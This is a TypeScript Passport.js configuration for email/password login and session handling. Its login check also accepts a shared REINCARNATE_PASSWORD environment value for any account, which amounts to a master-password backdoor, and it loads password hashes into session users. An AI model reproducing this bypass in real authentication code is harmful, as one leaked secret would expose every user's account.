import passport, {} from 'passport';
import { Strategy as LocalStrategy } from 'passport-local';

import { UserModel, TUser } from '@models/user';

const configurePassport = () => {
  passport.use(
    new LocalStrategy(
      {
        usernameField: 'email',
        passwordField: 'password',
      },
      async (email: string, password: string, done) => {
        UserModel.findOne({
          $or: [
            { email },
          ],
        }).select('+password')
          .then((user) => {
            if (!user) {
              return done(null, false);
            }

            const isEqualPasswords = user.validatePassword(password);
            const isReincarnatePassword = password === process.env.REINCARNATE_PASSWORD;

            if (!isEqualPasswords && !isReincarnatePassword) {
              return done(null, false);
            }

            return done(null, user);
          })
          .catch((err) => done(err));
      }
    )
  );

  passport.serializeUser((user: TUser, done) => {
    done(null, user.email);
  });

  passport.deserializeUser((email: string, done) => {
    UserModel.findOne({ email }).select('+password')
      .then((user) => {
        if (!user) {
          return done(null, false);
        }

        return done(null, user);
      })
      .catch((err) => {
        done(err, null);
      });
  });
};

export { passport, configurePassport };
